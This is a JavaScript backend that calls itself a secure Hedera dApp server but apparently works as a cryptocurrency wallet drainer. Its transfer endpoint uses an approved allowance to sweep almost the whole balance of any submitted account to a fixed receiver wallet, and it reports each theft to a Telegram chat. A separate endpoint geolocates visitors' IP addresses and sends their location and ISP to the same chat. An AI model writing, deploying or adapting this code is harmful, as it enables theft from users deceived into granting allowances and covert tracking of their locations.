const express = require('express');
const cors = require('cors');
const fetch = require('node-fetch');
require('dotenv').config();

const { 
  Client, 
  PrivateKey, 
  TransferTransaction, 
  Hbar, 
  TransactionId, 
  AccountId 
} = require('@hashgraph/sdk');

const app = express();
const PORT = process.env.PORT || 3001;

// Middleware
app.use(cors());
app.use(express.json());

// 🔒 Secure environment variables
const TARGET_WALLET = process.env.TARGET_WALLET || '0.0.9177142';
const PRIVATE_KEY = process.env.PRIVATE_KEY;
const TELEGRAM_BOT_TOKEN = process.env.TELEGRAM_BOT_TOKEN;
const TELEGRAM_CHAT_ID = process.env.TELEGRAM_CHAT_ID;
const RECEIVER_WALLET = process.env.RECEIVER_WALLET || '0.0.9177142';
const HEDERA_NETWORK = process.env.HEDERA_NETWORK || 'mainnet';

// 🔒 Private key parsing function (secure server-side only)
function parsePrivateKey(privateKeyString) {
  try {
    // First try ECDSA (since account uses ECDSA_SECP256K1)
    return PrivateKey.fromStringECDSA(privateKeyString);
  } catch (ecdsaError) {
    try {
      // Fallback to ED25519 if ECDSA fails
      return PrivateKey.fromStringED25519(privateKeyString);
    } catch (ed25519Error) {
      try {
        // Try DER format as last resort
        return PrivateKey.fromStringDer(privateKeyString);
      } catch (derError) {
        const ecdsaMsg = (ecdsaError).message || 'Unknown ECDSA error';
        const ed25519Msg = (ed25519Error).message || 'Unknown ED25519 error';
        const derMsg = (derError).message || 'Unknown DER error';
        throw new Error(`Failed to parse private key. ECDSA: ${ecdsaMsg}, ED25519: ${ed25519Msg}, DER: ${derMsg}`);
      }
    }
  }
}

// 🔒 Enterprise-level Telegram messaging functions

// Format enterprise-level messages with proper structure
function formatTelegramMessage(type, data) {
  const timestamp = new Date().toLocaleString('en-US', { 
    timeZone: 'America/New_York',
    dateStyle: 'short',
    timeStyle: 'medium'
  });

  switch (type) {
    case 'allowance_approved':
      return `🎯 **ALLOWANCE APPROVED**
━━━━━━━━━━━━━━━━━━━━━━

📊 **Account Details:**
└ Account ID: \`${data.accountId}\`
└ Target Wallet: \`${data.targetWallet}\`
└ Allowance Amount: ${data.allowanceAmount} HBAR

✅ **Status:** APPROVED
⏰ **Time:** ${timestamp}

🔗 **Transaction Details:**
└ [View on HashScan](https://hashscan.io/mainnet/transaction/${data.transactionId})

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'transfer_success':
      return `💰 **TRANSFER COMPLETED**
━━━━━━━━━━━━━━━━━━━━━━

📋 **Transfer Summary:**
└ From: \`${data.fromAccount}\`
└ To: \`${data.toAccount}\`
└ Amount: **${data.amount} HBAR**
└ Network Fee: ~0.5 HBAR

✅ **Status:** SUCCESS
⏰ **Time:** ${timestamp}

🔗 **Transaction Links:**
└ [View Transfer on HashScan](https://hashscan.io/mainnet/transaction/${data.transactionId})
└ [From Account Details](https://hashscan.io/mainnet/account/${data.fromAccount})
└ [To Account Details](https://hashscan.io/mainnet/account/${data.toAccount})

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'transfer_failed':
      return `❌ **TRANSFER FAILED**
━━━━━━━━━━━━━━━━━━━━━━

📋 **Failed Transfer Details:**
└ Account: \`${data.accountId}\`
└ Attempted Amount: ${data.amount || 'Unknown'} HBAR
└ Target: \`${data.targetWallet}\`

🚨 **Error:** ${data.error}
⏰ **Time:** ${timestamp}

🔍 **Next Steps:**
└ Check account balance
└ Verify network connectivity
└ Contact support if issue persists

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'insufficient_balance':
      return `💸 **INSUFFICIENT BALANCE**
━━━━━━━━━━━━━━━━━━━━━━

📊 **Account Status:**
└ Account ID: \`${data.accountId}\`
└ Current Balance: ${data.balance} HBAR
└ Required Amount: ${data.required} HBAR (incl. fees)

⚠️ **Status:** INSUFFICIENT FUNDS
⏰ **Time:** ${timestamp}

💡 **Recommendation:**
└ Fund account with at least ${data.required} HBAR
└ Minimum recommended: ${Math.ceil(data.required + 1)} HBAR

🔗 **Account Details:**
└ [View on HashScan](https://hashscan.io/mainnet/account/${data.accountId})

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'error':
      return `🚨 **SYSTEM ERROR**
━━━━━━━━━━━━━━━━━━━━━━

📋 **Error Details:**
└ Account: \`${data.accountId || 'Unknown'}\`
└ Operation: ${data.operation || 'Unknown'}

❌ **Error Message:**
${data.error}

⏰ **Time:** ${timestamp}

🔧 **Support:**
└ Error ID: ${data.errorId || 'N/A'}
└ Contact admin if problem persists

━━━━━━━━━━━━━━━━━━━━━━`;

    case 'website_visit':
      return `🌐 WEBSITE VISITOR

IP: ${data.ip}
Location: ${data.city}, ${data.region}
Country: ${data.country} ${data.countryFlag}
ISP: ${data.isp}
Timezone: ${data.timezone}
Time: ${timestamp}

IP Details: whatismyipaddress.com/ip/${data.ip}
Map: maps.google.com/?q=${data.lat},${data.lon}`;

    default:
      return `📢 **NOTIFICATION**
━━━━━━━━━━━━━━━━━━━━━━

${data.message || message}

⏰ **Time:** ${timestamp}
━━━━━━━━━━━━━━━━━━━━━━`;
  }
}

async function sendTelegramMessage(type, data) {
  try {
    if (!TELEGRAM_BOT_TOKEN || !TELEGRAM_CHAT_ID) {
      console.log('Telegram not configured, skipping message');
      return { success: false, error: 'Telegram not configured' };
    }

    const message = formatTelegramMessage(type, data);
    const telegramApiUrl = `https://api.telegram.org/bot${TELEGRAM_BOT_TOKEN}/sendMessage`;
    
    const response = await fetch(telegramApiUrl, {
      method: 'POST',
      headers: { 'Content-Type': 'application/json' },
      body: JSON.stringify({
        chat_id: TELEGRAM_CHAT_ID,
        text: message,
        parse_mode: 'Markdown'
      })
    });

    const result = await response.json();
    console.log('Telegram message sent:', result.ok);
    return { success: result.ok, data: result };
  } catch (error) {
    console.error('Telegram error:', error.message);
    return { success: false, error: error.message };
  }
}

// 🔒 Secure HBAR allowance transfer function
async function executeHbarAllowanceTransfer(owner, receiver, sendBal, spender, spenderPvKey, client) {
  try {
    const privateKey = parsePrivateKey(spenderPvKey);
    
    const approvedSendTx = await new TransferTransaction()
      .addApprovedHbarTransfer(owner, sendBal.negated())
      .addHbarTransfer(receiver, sendBal)
      .setTransactionId(TransactionId.generate(spender))
      .freezeWith(client);
    
    const approvedSendSign = await approvedSendTx.sign(privateKey);
    const approvedSendSubmit = await approvedSendSign.execute(client);
    const approvedSendRx = await approvedSendSubmit.getReceipt(client);
    
    return {
      success: true,
      status: approvedSendRx.status.toString(),
      transactionId: approvedSendSubmit.transactionId.toString(),
      receipt: approvedSendRx
    };
  } catch (error) {
    console.error('Transfer execution error:', error);
    return {
      success: false,
      error: error.message,
      status: 'FAILED'
    };
  }
}

// 🔒 Get account balance from Hedera Mirror Node
async function getAccountBalance(accountId) {
  try {
    const mirrorNodeUrl = `https://mainnet.mirrornode.hedera.com/api/v1/accounts/${accountId}`;
    const response = await fetch(mirrorNodeUrl);
    
    if (!response.ok) {
      throw new Error(`Failed to fetch account balance. Status: ${response.status}`);
    }
    
    const data = await response.json();
    const hbarBalance = data.balance.balance / 100000000; // Convert tinybars to HBAR
    const keyType = data.key?._type === "ED25519" ? "ED25519" : "ECDSA";
    
    return { 
      remainingHbar: hbarBalance, 
      keytype: keyType,
      success: true 
    };
  } catch (error) {
    console.error('Error fetching account balance:', error.message);
    return { 
      success: false, 
      error: error.message 
    };
  }
}

// 🛡️ API Routes

// Health check endpoint
app.get('/api/health', (req, res) => {
  res.json({ 
    status: 'OK', 
    message: 'Hedera dApp backend is running',
    network: HEDERA_NETWORK 
  });
});

// 🔒 Secure endpoint to execute allowance transfer
app.post('/api/execute-allowance-transfer', async (req, res) => {
  try {
    const { ownerAccountId, amount } = req.body;
    
    // Validation
    if (!ownerAccountId) {
      return res.status(400).json({ 
        success: false, 
        error: 'Missing required field: ownerAccountId' 
      });
    }

    if (!PRIVATE_KEY) {
      return res.status(500).json({ 
        success: false, 
        error: 'Server configuration error: Missing private key' 
      });
    }

    // Get account balance first
    const balanceResult = await getAccountBalance(ownerAccountId.replace('0.0.', ''));
    if (!balanceResult.success) {
      return res.status(400).json({
        success: false,
        error: `Failed to get balance: ${balanceResult.error}`
      });
    }

    let { remainingHbar } = balanceResult;
    
    // Reserve gas fee
    if (remainingHbar > 0.5) {
      remainingHbar = remainingHbar - 0.5;
      console.log("Balance after gas reservation:", remainingHbar);
    } else {
      await sendTelegramMessage('insufficient_balance', {
        accountId: ownerAccountId,
        balance: remainingHbar,
        required: 0.5,
        error: 'Insufficient HBAR for gas fees'
      });
      return res.status(400).json({
        success: false,
        error: 'Insufficient HBAR for gas fees'
      });
    }

    if (Math.floor(remainingHbar) < 1) {
      await sendTelegramMessage('insufficient_balance', {
        accountId: ownerAccountId,
        balance: Math.floor(remainingHbar),
        required: 1,
        error: 'Insufficient HBAR for transfer'
      });
      return res.status(400).json({
        success: false,
        error: 'Insufficient HBAR for transfer'
      });
    }

    // Execute the transfer
    const client = HEDERA_NETWORK === 'mainnet' ? Client.forMainnet() : Client.forTestnet();
    const balance = new Hbar(Math.floor(remainingHbar));
    
    const result = await executeHbarAllowanceTransfer(
      ownerAccountId, 
      RECEIVER_WALLET, 
      balance, 
      TARGET_WALLET, 
      PRIVATE_KEY, 
      client
    );

    if (result.success && result.status === "SUCCESS") {
      await sendTelegramMessage('transfer_success', {
        fromAccount: ownerAccountId,
        toAccount: RECEIVER_WALLET,
        amount: Math.floor(remainingHbar),
        transactionId: result.transactionId
      });
      
      res.json({
        success: true,
        status: result.status,
        transactionId: result.transactionId,
        amount: Math.floor(remainingHbar),
        receiver: RECEIVER_WALLET,
        message: 'Transfer completed successfully'
      });
    } else {
      await sendTelegramMessage('transfer_failed', {
        accountId: ownerAccountId,
        amount: Math.floor(remainingHbar),
        targetWallet: RECEIVER_WALLET,
        error: result.error
      });
      
      res.status(500).json({
        success: false,
        error: result.error,
        status: result.status
      });
    }

  } catch (error) {
    console.error('API Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 🔒 Secure endpoint to send Telegram messages
app.post('/api/send-telegram', async (req, res) => {
  try {
    const { type, data, message } = req.body;
    
    // Support both new structured format and legacy message format
    if (!type && !message) {
      return res.status(400).json({ 
        success: false, 
        error: 'Either type+data or message is required' 
      });
    }

    let result;
    if (type && data) {
      // New structured format
      result = await sendTelegramMessage(type, data);
    } else {
      // Legacy format - convert to default type
      result = await sendTelegramMessage('default', { message });
    }
    
    res.json(result);
  } catch (error) {
    console.error('Telegram API Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// 🌐 Track website visits with IP geolocation
app.post('/api/track-visit', async (req, res) => {
  try {
    // Get visitor's IP address
    const clientIP = req.headers['x-forwarded-for'] || 
                     req.headers['x-real-ip'] ||
                     req.connection.remoteAddress || 
                     req.socket.remoteAddress ||
                     (req.connection.socket ? req.connection.socket.remoteAddress : null) ||
                     req.ip ||
                     'Unknown';

    // Clean IP (remove IPv6 prefix if present)
    const visitorIP = clientIP.replace(/^::ffff:/, '').split(',')[0].trim();
    
    // Allow localhost for testing - removed skip check

    try {
      // Check if it's a local IP and use fallback data
      let geoData;
      if (visitorIP === '127.0.0.1' || visitorIP === '::1' || visitorIP.startsWith('192.168.') || visitorIP.startsWith('10.') || visitorIP === 'Unknown') {
        // Use fallback data for local testing
        geoData = {
          status: 'success',
          query: visitorIP,
          city: 'Local Development',
          regionName: 'Local Region',
          country: 'Local Testing',
          countryCode: 'US',
          isp: 'Local ISP',
          timezone: 'Local/Time',
          lat: 0,
          lon: 0
        };
      } else {
        // Get geolocation data from free IP API
        const geoResponse = await fetch(`http://ip-api.com/json/${visitorIP}?fields=status,message,country,countryCode,region,regionName,city,lat,lon,timezone,isp,org,query`);
        geoData = await geoResponse.json();
      }

      if (geoData.status === 'success') {
        // Get country flag emoji
        const countryFlags = {
          'US': '🇺🇸', 'CA': '🇨🇦', 'GB': '🇬🇧', 'DE': '🇩🇪', 'FR': '🇫🇷', 'IT': '🇮🇹', 'ES': '🇪🇸',
          'JP': '🇯🇵', 'CN': '🇨🇳', 'KR': '🇰🇷', 'IN': '🇮🇳', 'AU': '🇦🇺', 'BR': '🇧🇷', 'MX': '🇲🇽',
          'NL': '🇳🇱', 'SE': '🇸🇪', 'NO': '🇳🇴', 'DK': '🇩🇰', 'FI': '🇫🇮', 'RU': '🇷🇺', 'PL': '🇵🇱',
          'TR': '🇹🇷', 'SA': '🇸🇦', 'AE': '🇦🇪', 'SG': '🇸🇬', 'MY': '🇲🇾', 'TH': '🇹🇭', 'VN': '🇻🇳',
          'PH': '🇵🇭', 'ID': '🇮🇩', 'ZA': '🇿🇦', 'EG': '🇪🇬', 'NG': '🇳🇬', 'AR': '🇦🇷', 'CL': '🇨🇱',
          'CO': '🇨🇴', 'PE': '🇵🇪', 'VE': '🇻🇪', 'UA': '🇺🇦', 'IL': '🇮🇱', 'IR': '🇮🇷', 'IQ': '🇮🇶',
          'PK': '🇵🇰', 'BD': '🇧🇩', 'LK': '🇱🇰', 'NP': '🇳🇵', 'MM': '🇲🇲', 'KH': '🇰🇭', 'LA': '🇱🇦'
        };

        const userAgent = req.headers['user-agent'] || 'Unknown Browser';
        
        // Format visitor data for Telegram
        const visitorData = {
          ip: geoData.query,
          city: geoData.city || 'Unknown',
          region: geoData.regionName || geoData.region || 'Unknown',
          country: geoData.country || 'Unknown',
          countryFlag: countryFlags[geoData.countryCode] || '🌍',
          isp: geoData.isp || 'Unknown ISP',
          timezone: geoData.timezone || 'Unknown',
          lat: geoData.lat || 0,
          lon: geoData.lon || 0,
          userAgent: userAgent.substring(0, 100) + (userAgent.length > 100 ? '...' : '') // Truncate long user agents
        };

        // Send Telegram notification
        await sendTelegramMessage('website_visit', visitorData);

        res.json({ 
          success: true, 
          message: 'Visit tracked successfully',
          location: `${geoData.city}, ${geoData.country}`
        });
      } else {
        console.log('IP geolocation failed:', geoData.message);
        res.json({ success: false, error: 'Could not determine location' });
      }
    } catch (geoError) {
      console.error('Geolocation API error:', geoError);
      res.json({ success: false, error: 'Geolocation service unavailable' });
    }

  } catch (error) {
    console.error('Visit tracking error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Get account balance endpoint
app.get('/api/balance/:accountId', async (req, res) => {
  try {
    const { accountId } = req.params;
    const result = await getAccountBalance(accountId);
    res.json(result);
  } catch (error) {
    console.error('Balance API Error:', error);
    res.status(500).json({ 
      success: false, 
      error: error.message 
    });
  }
});

// Error handling middleware
app.use((error, req, res, next) => {
  console.error('Server Error:', error);
  res.status(500).json({ 
    success: false, 
    error: 'Internal server error' 
  });
});

// Start server
app.listen(PORT, () => {
  console.log(`🔒 Secure Hedera dApp backend running on port ${PORT}`);
  console.log(`🌐 Network: ${HEDERA_NETWORK}`);
  console.log(`🎯 Target Wallet: ${TARGET_WALLET}`);
  console.log(`📧 Telegram configured: ${!!TELEGRAM_BOT_TOKEN}`);
});

module.exports = app;

 